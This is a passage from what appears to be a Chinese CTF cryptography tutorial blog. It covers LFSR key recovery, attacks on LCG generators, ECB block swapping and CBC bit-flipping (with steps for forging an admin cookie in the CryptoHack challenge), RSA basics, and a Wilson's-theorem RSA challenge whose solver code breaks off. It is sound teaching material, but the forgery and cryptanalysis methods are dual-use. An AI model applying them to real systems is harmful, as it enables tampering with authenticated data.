\\end{pmatrix}= \\begin{pmatrix} a_n\\\\ a_{n+1} \\\\ \\vdots \\\\ a_{2n-1} \\end{pmatrix}\\]</span></p>\r\n<p><strong>示例：</strong>假设窃密者得到密文串10110 10111 10010和相应的明文串01100 11111 11001，得密钥流为11010 01000 01011（密文串与明文串异或）。进一步假定窃密者还知道密钥流是使用5级线性反馈移位寄存器产生的，那么窃密者可利用密钥流前10个比特建立如下方程：</p>\r\n<p><span class=\"math display\">\\[(a_6\\space a_7\\space a_8\\space a_9\\space a_{10})=(c_5\\space c_4\\space c_3\\space c_2\\space c_1) { \\begin{pmatrix} a_1&amp; a_2&amp; a_3&amp; a_4&amp; a_5 \\\\ a_2&amp; a_3&amp; a_4&amp; a_5&amp; a_6 \\\\ a_3&amp; a_4&amp; a_5&amp; a_6&amp; a_7 \\\\ a_4&amp; a_5&amp; a_6&amp; a_7&amp; a_8 \\\\ a_5&amp; a_6&amp; a_7&amp; a_8&amp; a_9 \\end{pmatrix} }\\]</span></p>\r\n<p>代入数字，得到如下方程：</p>\r\n<p><span class=\"math display\">\\[(0\\space 1\\space 0\\space 0\\space 0)=\\space (c_5\\space c_4\\space c_3\\space c_2\\space c_1) { \\begin{pmatrix} 1&amp;1&amp;0&amp;1&amp;0 \\\\ 1&amp;0&amp;1&amp;0&amp;0 \\\\ 0&amp;1&amp;0&amp;0&amp;1 \\\\ 1&amp;0&amp;0&amp;1&amp;0 \\\\ 0&amp;0&amp;1&amp;0&amp;0 \\end{pmatrix} }\\]</span></p>\r\n<p>又因为</p>\r\n<p><span class=\"math display\">\\[{ \\begin{pmatrix} 1&amp;1&amp;0&amp;1&amp;0 \\\\ 1&amp;0&amp;1&amp;0&amp;0 \\\\ 0&amp;1&amp;0&amp;0&amp;1 \\\\ 1&amp;0&amp;0&amp;1&amp;0 \\\\ 0&amp;0&amp;1&amp;0&amp;0 \\end{pmatrix} }^{-1}= { \\begin{pmatrix} 0&amp;1&amp;0&amp;0&amp;1 \\\\ 1&amp;0&amp;0&amp;1&amp;0 \\\\ 0&amp;0&amp;0&amp;0&amp;1 \\\\ 0&amp;1&amp;0&amp;1&amp;1 \\\\ 1&amp;0&amp;1&amp;1&amp;0 \\end{pmatrix} }\\]</span></p>\r\n<p>得到如下结果</p>\r\n<p><span class=\"math display\">\\[(C_5\\space C_4\\space C_3\\space C_2\\space C_1)=(0\\space1\\space0\\space0\\space0) { \\begin{pmatrix} 0&amp;1&amp;0&amp;0&amp;1 \\\\ 1&amp;0&amp;0&amp;1&amp;0 \\\\ 0&amp;0&amp;0&amp;0&amp;1 \\\\ 0&amp;1&amp;0&amp;1&amp;1 \\\\ 1&amp;0&amp;1&amp;1&amp;0 \\end{pmatrix} }\\]</span></p>\r\n<p>化简得：</p>\r\n<p><span class=\"math display\">\\[(C_5\\space C_4\\space C_3\\space C_2\\space C_1)=(1\\space 0\\space0\\space1\\space0)\\]</span></p>\r\n<p>即反馈函数为</p>\r\n<p><span class=\"math display\">\\[a_{i+5}=c_5a_i\\oplus c_2a_{i+3}=a_i\\oplus a_{i+3}\\]</span></p>\r\n<h5 id=\"练习-3\">练习</h5>\r\n<p><a href=\"https://buuoj.cn/challenges#%5BAFCTF2018%5DTiny%20LFSR\">[AFCTF2018]Tiny LFSR</a></p>\r\n<h4 id=\"lcg\">LCG</h4>\r\n<p><strong>什么是LCG</strong></p>\r\n<p>LCG是线性同余算法，用来生成伪随机数，定义了三个整数，乘数m，增量c和模数n，m,c,n是生成器设定的常数。</p>\r\n<p><span class=\"math display\">\\[S_{i+1} \\equiv m\\cdot S_i+c(mod\\ n)\\]</span></p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">LCG</span>(<span class=\"params\">seed, params</span>):</span><br><span class=\"line\">    m,c,n = params</span><br><span class=\"line\">    x = seed % n</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        x = (m * x + c) % n</span><br><span class=\"line\">        <span class=\"keyword\">yield</span> x</span><br><span class=\"line\"></span><br><span class=\"line\">seed = <span class=\"number\">114</span></span><br><span class=\"line\">m = <span class=\"number\">10</span></span><br><span class=\"line\">c = <span class=\"number\">12</span></span><br><span class=\"line\">n = <span class=\"number\">514</span></span><br><span class=\"line\">lcg = LCG(seed, (m,c,n))</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\"><span class=\"comment\">#     print(next(lcg))</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br></pre></td></tr></table></figure>\r\n<h5 id=\"对于lcg的攻击\">对于LCG的攻击</h5>\r\n<ol type=\"1\">\r\n<li><p>已知m，c，n以及s0的情况</p>\r\n<p><span class=\"math display\">\\[s_1 \\equiv m\\cdot s_0+c(mod\\ n)\\]</span></p></li>\r\n</ol>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">source=<span class=\"string\">b&quot;flag&#123;*********&#125;&quot;</span></span><br><span class=\"line\">plaintext=bytes_to_long(source)</span><br><span class=\"line\">length=plaintext.bit_length()</span><br><span class=\"line\">a = getPrime(length)</span><br><span class=\"line\">b = getPrime(length)</span><br><span class=\"line\">n = getPrime(length)</span><br><span class=\"line\">seed = <span class=\"number\">3281857254</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;seed = &quot;</span>,seed)</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    seed = (a*seed+b)%n</span><br><span class=\"line\">ciphertext = seed^plaintext</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;a = &quot;</span>,a)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;b = &quot;</span>,b)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;n = &quot;</span>,n)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"string\">&quot;c = &quot;</span>,ciphertext)</span><br><span class=\"line\">    <span class=\"comment\"># seed =  3281857254</span></span><br><span class=\"line\">    <span class=\"comment\"># a =  540148988578728116547540370955365641360430675811</span></span><br><span class=\"line\">    <span class=\"comment\"># b =  691767495086914115399769389216940791240924902423</span></span><br><span class=\"line\">    <span class=\"comment\"># n =  524988838768493801533758786071154204860765947187</span></span><br><span class=\"line\">    <span class=\"comment\"># c =  210504742144537844110730225465101123460260815127</span></span><br></pre></td></tr></table></figure>\r\n<pre><code><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">seed =  <span class=\"number\">3281857254</span></span><br><span class=\"line\">a =  <span class=\"number\">540148988578728116547540370955365641360430675811</span></span><br><span class=\"line\">b =  <span class=\"number\">691767495086914115399769389216940791240924902423</span></span><br><span class=\"line\">n =  <span class=\"number\">524988838768493801533758786071154204860765947187</span></span><br><span class=\"line\">c =  <span class=\"number\">210504742144537844110730225465101123460260815127</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">10</span>):</span><br><span class=\"line\">    seed = (a*seed+b)%n</span><br><span class=\"line\">flag =  c ^ seed</span><br><span class=\"line\"><span class=\"comment\"># print(long_to_bytes(flag))</span></span><br></pre></td></tr></table></figure></code></pre>\r\n<ol start=\"2\" type=\"1\">\r\n<li><p>已知m、n、s0、s1的情况 <span class=\"math display\">\\[\\begin{aligned}s_1 &amp;\\equiv m\\cdot s_0+c(mod\\ n)\\\\\r\n c&amp;\\equiv s_1 - m\\cdot s_0(mod\\ n)\\end{aligned}\\]</span></p></li>\r\n<li><p>已知n、s0、s1、s2的情况 <span class=\"math display\">\\[\\begin{aligned}s_1 &amp;\\equiv m\\cdot s_0+c(mod\\ n)\\\\\r\n s_2 &amp;\\equiv m\\cdot s_1+c(mod\\ n)\\\\\r\ns_1-s_2 &amp;\\equiv m\\cdot(s_0-s_1)(mod\\ n)\\\\\r\nm&amp;\\equiv\\frac{s_1-s_2}{s_0-s_1}(mod\\ n)\\end{aligned}\\]</span></p></li>\r\n</ol>\r\n<h4 id=\"分组密码\">分组密码</h4>\r\n<p>密码学家和计算机科学家们继续为安全加密算法的设计做出不懈的努力。他们设计了多种安全可靠的加密算法。比较著名的有1977年1月由美国国家标准局公布的数据加密标准(Data Encryption Standard，DES)。DES的出现是现代密码学的标志之一，意味着密码学已经上升为数学和计算机科学的交叉学科。DES被使用了将近20年。为了适应现今的安全要求，1998年密码学家们推出了一系列替代 DES的新型算法，如MARS、RC6、Sperpent、Twofish等。2000年10月2日，美国国家标准和技术协会(National lnstitution of Standards and Technology，NIST)宣布，经过3年多的筛选和测评，比利时密码学家Daemen和Rijmen共同设计的Rijndael加密算法成为了新的加密标准。这个新的算法被命名为高级加密标准(Advanced Encryption Standard，AES)。现今，AES已经被广泛使用。密码学家们仍然没有发现AES的致命缺陷。我们可以认为，到现在为止，AES仍然是安全的加密算法。</p>\r\n<p>在今天我们所使用的加密法中，分组加密是最常见的类型。分组加密法每次作用于固定大小的分组（与流密码相反，流密码每次只加密一位）。此外，一个分组的比特数就称为分组长度。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160241776.png\" alt=\"block_cipher\"><figcaption aria-hidden=\"true\">block_cipher</figcaption>\r\n</figure>\r\n<h5 id=\"分组密码的模式\">分组密码的模式</h5>\r\n<p><strong>什么是模式</strong></p>\r\n<p>分组密码只能加密固定长度的分组，但是我们需要加密的明文长度可能会超过分组密码的分组长度，这时就需要对分组密码算法进行迭代，以便将一段很长的明文全部加密。这个迭代的方法就称为分组密码的模式（mode）。</p>\r\n<p>在介绍模式前我们引入两个术语： 明文分组<span class=\"math inline\">\\(（M_n）\\)</span>：指分组密码算法中作为加密对象的明文，明文分组的长度与分组密码算法的分组长度是等长的。 密文分组<span class=\"math inline\">\\(（C_n）\\)</span>：指使用分组密码算法将明文分组加密之后所生成的密文。</p>\r\n<p><strong>电子编码薄模式（ECB）</strong></p>\r\n<p>这是分组加密最简单的一种模式，即明文的每一个块加密成密文的每一个块。明文被分为若干块<span class=\"math inline\">\\(M_1,M_2,M_3,M_4,… ,M_n\\)</span>，通过加密方法<span class=\"math inline\">\\(E_k\\)</span>，得到密文<span class=\"math inline\">\\(C_1,C_2,C_3,C_4,…,C_n\\)</span>，当最后一个明文分组小于分组长度时，需要用一些特定的数据进行填充。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160253070.png\" alt=\"ecb_cipher\"><figcaption aria-hidden=\"true\">ecb_cipher</figcaption>\r\n</figure>\r\n<p>解密过程也是一次对一个分组解密，而且每次解密都使用同一密钥。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160305798.png\" alt=\"ecb_dcipher\"><figcaption aria-hidden=\"true\">ecb_dcipher</figcaption>\r\n</figure>\r\n<p><strong>ECB模式的特点</strong></p>\r\n<p>ECB模式是所有模式中最简单的一种。ECB模式中，明文分组与密文分组是一一对应关系，因此，如果明文中存在多个相同的明文分组，则这些明文分组最终都将被转换为相同的 密文分组。这样一来，只要观察一下密文，就可以知道明文中存在怎么样的重复组合，并可以以此为线索来破译密码，因此ECB模式是存在一定风险的。</p>\r\n<p><strong>对ECB模式的攻击</strong></p>\r\n<p>ECB模式中，每个明文分组都是各自独立地进行加密和解密，但这其实是一个很大的弱点。假如存在一个攻击者，当他作为中间人截获两方的通信时，他能够改变密文的分组顺序，当接收者对密文进行解密时，由于密文分组的顺序被改变了，因此相应的明文分组的顺序也被改变了，那么接收者实际上是解密出了一段被篡改后的密文。在这种场景中，攻击者不需要破译密码，也不需要知道分组密码的算法，他只需要知道哪个分组记录了什么样的数据。 思考一个模拟的场景：</p>\r\n<p>假设分组的长度为128比特（16字节），某银行的转账请求数据由以下三个分组构成。</p>\r\n<p>分组1：付款人的银行账号</p>\r\n<p>分组2：收款人的银行账号</p>\r\n<p>分组3：转账金额</p>\r\n<p>此时我们模拟一个转账请求数据：从A-5374帐号向B-6671帐号转账1亿元，用16进制数据表示：</p>\r\n<p>明文分组1=41 2D 35 33 37 34 20 20 20 20 20 20 20 20 20 20 （付款人：A-5374）</p>\r\n<p>明文分组2=42 2D 36 36 37 31 20 20 20 20 20 20 20 20 20 20 （收款人：B-6671）</p>\r\n<p>明文分组3=31 30 30 30 30 30 30 30 30 20 20 20 20 20 20 20 （转账金额：100000000）</p>\r\n<p>接下来，攻击者将密文分组1和2的内容进行对调。（此时攻击者并不知道分组的具体内容，但知道这是付款人信息）</p>\r\n<p>明文分组2=42 2D 36 36 37 31 20 20 20 20 20 20 20 20 20 20 （收款人：B-6671）</p>\r\n<p>明文分组1=41 2D 35 33 37 34 20 20 20 20 20 20 20 20 20 20 （付款人：A-5374）</p>\r\n<p>明文分组3=31 30 30 30 30 30 30 30 30 20 20 20 20 20 20 20 （转账金额：100000000）</p>\r\n<p>当银行对信息进行解密时，信息的内容实际上已经发生了改变，付款人的身份和收款人的身份已经被调换了。 这就是ECB模式的最大弱点，可以在不破译密文的情况下操纵密文。</p>\r\n<p><strong>密码分组链接模式（CBC）</strong></p>\r\n<p>这个模式的实现更复杂、更安全，因此它是使用最普遍的块加密模式。在这种模式下，来自上一块的密文与当前明文块做XOR逻辑运算，得到的结果才是加密的位块。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/7b3b9d10db494a4c8323e81f506fa5d1.webp\" alt=\"cbc\"><figcaption aria-hidden=\"true\">cbc</figcaption>\r\n</figure>\r\n<p><strong>CBC模式的特点</strong></p>\r\n<p>在CBC模式中，我们无法单独对一个中间的明文分组进行加密，加入要生成第三组密文，那么至少需要凑齐分组1,2,3才行。 观察CBC模式的解密过程，我们发现：如果加密后的分组C2出现内容错误（存储介质故障或者网络传输中的误码等）使得一个分组中的0变成了1。那么解密的时候最多只会让2个分组内容受到数据损坏的影响。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160408841.png\" alt=\"cbc_corrupt\"><figcaption aria-hidden=\"true\">cbc_corrupt</figcaption>\r\n</figure>\r\n<p>但是，如果不是数据出错，而是密文分组中有比特缺失，那么即使丢失一个比特，也会导致密文分组的长度发生变化，后续的分组发生错位，最终导致后面的所有密文分组都会解密出无效的数据。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160502967.png\" alt=\"cbc_bad\"><figcaption aria-hidden=\"true\">cbc_bad</figcaption>\r\n</figure>\r\n<p><strong>对CBC模式的攻击</strong></p>\r\n<p>比特反转：如果攻击者截获了传递信息，在这段信息中包含了初始向量IV，根据CBC模式的解密方式我们可以看出，如果攻击者对IV中的任意比特进行反转（1变为0，0变为1），那么明文中相应的比特位就会发生反转。</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160514687.png\" alt=\"cbc_attack\"><figcaption aria-hidden=\"true\">cbc_attack</figcaption>\r\n</figure>\r\n<h5 id=\"练习-4\">练习</h5>\r\n<p><a href=\"http://aes.cryptohack.org/flipping_cookie/\" class=\"uri\">http://aes.cryptohack.org/flipping_cookie/</a></p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">KEY = ?</span><br><span class=\"line\">FLAG = ?</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@chal.route(<span class=\"params\"><span class=\"string\">&#x27;/flipping_cookie/check_admin/&lt;cookie&gt;/&lt;iv&gt;/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">check_admin</span>(<span class=\"params\">cookie, iv</span>):</span><br><span class=\"line\">    cookie = <span class=\"built_in\">bytes</span>.fromhex(cookie)</span><br><span class=\"line\">    iv = <span class=\"built_in\">bytes</span>.fromhex(iv)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class=\"line\">        decrypted = cipher.decrypt(cookie)</span><br><span class=\"line\">        unpadded = unpad(decrypted, <span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> &#123;<span class=\"string\">&quot;error&quot;</span>: <span class=\"built_in\">str</span>(e)&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">b&quot;admin=True&quot;</span> <span class=\"keyword\">in</span> unpadded.split(<span class=\"string\">b&quot;;&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> &#123;<span class=\"string\">&quot;flag&quot;</span>: FLAG&#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> &#123;<span class=\"string\">&quot;error&quot;</span>: <span class=\"string\">&quot;Only admin can read the flag&quot;</span>&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@chal.route(<span class=\"params\"><span class=\"string\">&#x27;/flipping_cookie/get_cookie/&#x27;</span></span>)</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_cookie</span>():</span><br><span class=\"line\">    expires_at = (datetime.today() + timedelta(days=<span class=\"number\">1</span>)).strftime(<span class=\"string\">&quot;%s&quot;</span>)</span><br><span class=\"line\">    cookie = <span class=\"string\">f&quot;admin=False;expiry=<span class=\"subst\">&#123;expires_at&#125;</span>&quot;</span>.encode()</span><br><span class=\"line\"></span><br><span class=\"line\">    iv = os.urandom(<span class=\"number\">16</span>)</span><br><span class=\"line\">    padded = pad(cookie, <span class=\"number\">16</span>)</span><br><span class=\"line\">    cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class=\"line\">    encrypted = cipher.encrypt(padded)</span><br><span class=\"line\">    ciphertext = iv.<span class=\"built_in\">hex</span>() + encrypted.<span class=\"built_in\">hex</span>()</span><br></pre></td></tr></table></figure>\r\n<p>P1 = 'admin=False;expi'</p>\r\n<p>fake_P = 'admin=True;expir'</p>\r\n<p>IV ^ DEC(C1) = P1</p>\r\n<p>IV ^ P1 ^ DEC(C1) = P1 ^ P1</p>\r\n<p>IV ^ P1 ^ DEC(C1) = 0</p>\r\n<p>IV ^ P1 ^ fake_P ^ DEC(C1) = fake_P</p>\r\n<ol type=\"1\">\r\n<li>get_cookie() submit</li>\r\n<li>复制cookie值为s</li>\r\n<li>获得初始IV=s[:32]</li>\r\n<li>获得P1</li>\r\n<li>获得fake_P</li>\r\n<li>将IV与P1与fake_P异或，得到IV2</li>\r\n<li>将IV2与s[32:]提交到check_admin中</li>\r\n</ol>\r\n<h3 id=\"公钥密码\">公钥密码</h3>\r\n<p>加密的困境:密钥分发问题</p>\r\n<p>虽然密码学家们设计了多种安全的加密算法，但这些加密算法在使用之前都要解决一个很麻烦的问题:密钥分发问题。</p>\r\n<p>以门锁为例。我们几乎每天都要和门锁与钥匙打交道。安全的门锁大概有什么样的要求呢?简单地说有这么几条:</p>\r\n<p>门锁要非常坚固，如果没有钥匙的话，任何人都不能够打开门锁;· 钥匙必须足够复杂，除非得到了原始的开锁钥匙，否则钥匙非常难以复制;· 当然了，门本身也必须足够结实。</p>\r\n<p>对应来看的话，加密算法也需要具有这些特征:</p>\r\n<p>加密算法要足够安全，没有密钥的攻击者无法从密文中解读出任何有价值的信息; 密钥必须足够复杂，足够长，哪怕密钥有一个数设置错误，都无法正确解密; 当然了，使用加密算法时也需要足够小心，不要有操作上的失误。</p>\r\n<p>按照这样的安全要求，人们制作了很多安全的门锁，对应的钥匙也变得越来越复杂。但是，这些门锁都有一个共同的问题:</p>\r\n<p>锁门的时候必须用钥匙锁!</p>\r\n<p>在实际生活中如果只是我们自己锁门的话还好。可是，如果我希望别人帮我锁门的话，事情就比较麻烦了，比如: 亲戚来我家做客，但我临时有事要出门，不知道几点回来。难道我要请亲戚看家，等我回来再离开吗?最好的方法是亲戚离开我家的时候，帮我把门撞上就好了。</p>\r\n<p>我新买了一套房子，需要装修队装修。装修过程中，我可以每天早上来新家把门打开，允许装修队随时进入。但是，如果今天的装修工作结束了，装修队需要等我晚上回来把门锁上才能走? 人类的智慧是无穷的。为了解决上面的问题，人类设计了能撞门的锁。锁门的时候，我们就不再需要钥匙了，直接把门撞上就可以离开。只要把门撞好，没有钥匙同样也打不开门锁。</p>\r\n<p>在双方进行通信时，我们也会遇到这样的问题。通信就好像双方互相之间发送密码保险箱一样：发送方把信息放在保险箱中，用钥匙将保险箱锁住，这就是加密过程；接收方用相同的钥匙打开保险箱，得到放置在内部的信息，这就是解密过程</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160536135.png\" alt=\"s_cry\"><figcaption aria-hidden=\"true\">s_cry</figcaption>\r\n</figure>\r\n<p>在公钥密码学诞生之前，密码学家们所设计的所有加密算法都遵从了上面的原理。由于加密解密所使用的密钥相同的，看起来就像是镜子里面对称的一样，因此密码学上把这类加密方法称为<strong>「对称加密」(Symmetric Encryption)</strong>。</p>\r\n<p>然而，我们遇到了一个很棘手的问题：:双方在通信之前如何得到同一个保险箱的同一个钥匙呢？仅有的办法是两个人一同购买一个保险箱，每个人拿着一把钥匙。然而，在实际通信过程中绝大多数情况下双方很难见面，怎么办呢？第二次世界大战期间，德军解决的方法是设立通信兵。通信兵每个月集合一次，集合时下发这个月所使用的恩格玛机密钥。</p>\r\n<p>那么，在密码学上能不能找到一种类似撞门的方法：设计一种加密算法，使得加密明文时发送方不需要知道密钥，只使用一个接收方公开的信息实现加密；解密时，接收方仍然可以使用自己的密钥进行解密，而其他人却无法从密文中获取任何有价值的信息呢？</p>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160548577.png\" alt=\"as_cry\"><figcaption aria-hidden=\"true\">as_cry</figcaption>\r\n</figure>\r\n<p>这时候，加密和解密所使用的密钥就不一样了，密钥不再对称。密码学上把这种加密方法称为「非对称加密」(AsymmetricEncryption)。由于加密时，发送方虽然也使用了密钥，但这个密钥是接收方向全世界公开的，因此这种加密方法又被称为<strong>「公钥加密」(Public Key Encryption)</strong>。所有利用公钥思想实现的密码学被称为「公钥密码学」(Public Key Cryptography)。在1976年之前，公钥密码学的想法被视为天方夜谭。但在1976年，密码学的天才们提出了并实现了这个想法。而这个想法的实现就用到了<code>质数性质</code>和<code>数学困难问题</code>。</p>\r\n<h4 id=\"rsa算法\">RSA算法</h4>\r\n<p>RSA算法拥有三个步骤:</p>\r\n<p>密钥生成、加密、解密。</p>\r\n<p>Alice执行密钥生成步骤，得到自己的公钥和私钥，并把公钥向外界公开。发送方Bob将利用Alice 的公钥对明文进行加密，并把加密结果发送给Alice。只有拥有公钥所对应私钥的 Alice 才能执行解密步骤，正确恢复出明文。</p>\r\n<p>RSA算法的具体过程</p>\r\n<ol type=\"1\">\r\n<li><p>密钥生成: Alice选择两个大质数𝑝,𝑞，计算𝑛=𝑝⋅𝑞。随后，Alice 选择一个与欧拉函数<span class=\"math inline\">\\(\\phi(n)=(p−1)(q−1)\\)</span>互质的数𝑒，并计算<span class=\"math inline\">\\(d=e^{−1}mod(p−1)(q−1)\\)</span>。前面我们知道，只有当𝑒和<span class=\"math inline\">\\((p−1)(q−1)\\)</span>互质，Alice才能找到满足条件的d。Alice的私钥为d，公钥为(𝑛, 𝑒)。</p></li>\r\n<li><p>加密:Bob想要给Alice发送明文m，Bob简单地计算<span class=\"math inline\">\\(c=m^e(mod\\ n)\\)</span>，就得到了密文c。</p></li>\r\n<li><p>解密: Alice 收到密文c后，计算<span class=\"math inline\">\\(m=C^d(mod\\ n)\\)</span>。</p></li>\r\n</ol>\r\n<figure>\r\n<img src=\"/2022/09/13/%E5%AF%86%E7%A0%81%E5%AD%A6/image-20220913160558355.png\" alt=\"rsa\"><figcaption aria-hidden=\"true\">rsa</figcaption>\r\n</figure>\r\n","categories":["CTF"],"tags":["crypto","share"]},{"title":"威尔逊定理","url":"/2022/09/12/%E5%A8%81%E5%B0%94%E9%80%8A%E5%AE%9A%E7%90%86/","content":"<h2 id=\"威尔逊定理\">威尔逊定理</h2>\r\n<ol type=\"1\">\r\n<li><p>定义</p>\r\n<blockquote>\r\n<p>当且仅当p为素数时，<span class=\"math inline\">\\((p-1)!\\equiv -1\\mod p\\)</span></p>\r\n</blockquote>\r\n<p><span id=\"more\"></span></p></li>\r\n<li><p>题目</p>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sympy</span><br><span class=\"line\"><span class=\"keyword\">import</span> random</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">myGetPrime</span>():</span><br><span class=\"line\">    A = getPrime(<span class=\"number\">513</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(A)</span><br><span class=\"line\">    B = A - random.randint(<span class=\"number\">1e3</span>, <span class=\"number\">1e5</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(B)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sympy.nextPrime((B!) % A)</span><br><span class=\"line\"></span><br><span class=\"line\">p = myGetPrime()</span><br><span class=\"line\"><span class=\"comment\"># A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class=\"line\"><span class=\"comment\"># B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span></span><br><span class=\"line\"></span><br><span class=\"line\">q = myGetPrime()</span><br><span class=\"line\"><span class=\"comment\"># A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class=\"line\"><span class=\"comment\"># B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class=\"line\"></span><br><span class=\"line\">r = myGetPrime()</span><br><span class=\"line\"></span><br><span class=\"line\">n = p*q*r</span><br><span class=\"line\"><span class=\"comment\"># n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733</span></span><br><span class=\"line\">c = <span class=\"built_in\">pow</span>(flag, e, n)</span><br><span class=\"line\"><span class=\"comment\"># e=0x1001</span></span><br><span class=\"line\"><span class=\"comment\"># c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428</span></span><br><span class=\"line\"><span class=\"comment\"># so,what is the flag?</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p></li>\r\n<li><p>求解过程</p>\r\n<p>此题难点在于<code>(B!)%A</code>，求B的阶乘的模，而B又很大，计算阶乘不大现实，由威尔逊定理可得：</p>\r\n<p><span class=\"math display\">\\[\r\n \\begin{align*}\r\n (A_1-1)! &amp;\\equiv -1\\mod A_1\\\\\r\n \\Rightarrow (B_1)!*k &amp;\\equiv -1\\mod A_1,(k = (A_1-1)!/B_1!)\\\\\r\n \\Rightarrow(B_1)!&amp;\\equiv -k^{-1}\\mod A_1,(k^{-1}为k在A_1下的逆元)\r\n \\end{align*}\r\n \\]</span></p>\r\n<p>代码如下：</p>\r\n<p><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sympy</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes, bytes_to_long</span><br><span class=\"line\"></span><br><span class=\"line\">A1 = <span class=\"number\">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407</span></span><br><span class=\"line\">B1 = <span class=\"number\">21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596</span></span><br><span class=\"line\"></span><br><span class=\"line\">A2 = <span class=\"number\">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927</span></span><br><span class=\"line\">B2 = <span class=\"number\">16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026</span></span><br><span class=\"line\">n = <span 